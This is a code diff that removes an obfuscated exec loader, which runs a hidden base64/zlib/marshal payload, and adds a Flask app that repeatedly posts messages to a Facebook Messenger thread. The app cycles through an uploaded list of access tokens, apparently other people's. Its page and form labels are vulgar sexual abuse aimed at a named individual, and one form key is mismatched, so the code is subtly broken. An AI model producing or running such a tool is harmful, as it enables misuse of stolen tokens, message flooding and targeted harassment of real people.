@@ -1,4 +1,231 @@
-#THHEE FWAKERR LEEGGENND AADIIII HHEREE-!
-#——————————————————————————————————————
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+from flask import Flask, request
+import requests
+from threading import Thread, Event
+import time
+
+app = Flask(__name__)
+app.debug = True
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+stop_event = Event()
+threads = []
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages):
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message sent using token {access_token}: {message}")
+                else:
+                    print(f"Failed to send message using token {access_token}: {message}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    global threads
+    if request.method == 'POST':
+        token_file = request.files['Kartik ki maa ki chut me tokel dal']
+        access_tokens = token_file.read().decode().strip().splitlines()
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
+            threads.append(thread)
+            thread.start()
+
+    return '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KARTIK KA BAAP AFAM</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    label {
+      color: white;
+    }
+
+    .file {
+      height: 30px;
+    }
+
+    body {
+      background-image: url('https://i.imgur.com/R6GPvix.jpeg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+
+    .container {
+      max-width: 350px;
+      height: 600px;
+      border-radius: 20px;
+      padding: 20px;
+      animation: border-animation 3s infinite;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      border: none;
+      resize: none;
+    }
+
+    @keyframes border-animation {
+      0% {
+        box-shadow: 0 0 15px white;
+      }
+      50% {
+        box-shadow: 0 0 30px red;
+      }
+      100% {
+        box-shadow: 0 0 15px white;
+      }
+    }
+
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: white;
+    }
+
+    .header {
+      text-align: center;
+      padding-bottom: 20px;
+      animation: text-animation 3s infinite;
+    }
+
+    .btn-submit {
+      width: 100%;
+      margin-top: 10px;
+      animation: rounding-animation 2s infinite;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #888;
+    }
+
+    .dropdown {
+      display: inline-block;
+      margin-top: 10px;
+    }
+
+    .dropdown-menu a {
+      color: black;
+    }
+
+    @keyframes rounding-animation {
+      0% {
+        border-radius: 0;
+      }
+      50% {
+        border-radius: 50px;
+      }
+      100% {
+        border-radius: 0;
+      }
+    }
+
+    @keyframes text-animation {
+      0% {
+        color: white;
+        text-shadow: 0 0 10px red;
+      }
+      50% {
+        color: red;
+        text-shadow: 0 0 20px white;
+      }
+      100% {
+        color: white;
+        text-shadow: 0 0 10px red;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">KARTIK KE MA XODAK AFAM HERE</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenFile" class="form-label">Kartik ki maa ki chut me tokel dal</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Kartik ki behen kk chut me convo id dal</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Yaha kartik ki maa chodne wale ka name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">ᴛɪᴍᴇ ᴅᴇʟᴀʏ ɪɴ (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">ꜰɪʟᴇ ɴᴩ</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">sᴛᴀʀᴛ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs</button>
+    </form>
+    <form method="post" action="/stop">
+      <button type="submit" class="btn btn-danger btn-submit mt-3">sᴛᴏᴘ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>&copy; 2024 All Rights Reserved By Asmit Adk.</p>
+    <div class="dropdown">
+      <button class="btn btn-secondary dropdown-toggle" type="button" id="contactDropdown" data-bs-toggle="dropdown" aria-expanded="false">
+        Contact
+      </button>
+      <ul class="dropdown-menu" aria-labelledby="contactDropdown">
+        <li><a class="dropdown-item" href="https://www.facebook.com/Asmit021">Facebook</a></li>
+        <li><a class="dropdown-item" href="https://www.instagram.com/_datboii.asmit?igsh=MTN0N2Y5cDNqN2lvbw==">Instagram</a></li>
+      </ul>
+    </div>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
+</body>
+</html>
+'''
+
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return 'Message sending stopped.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
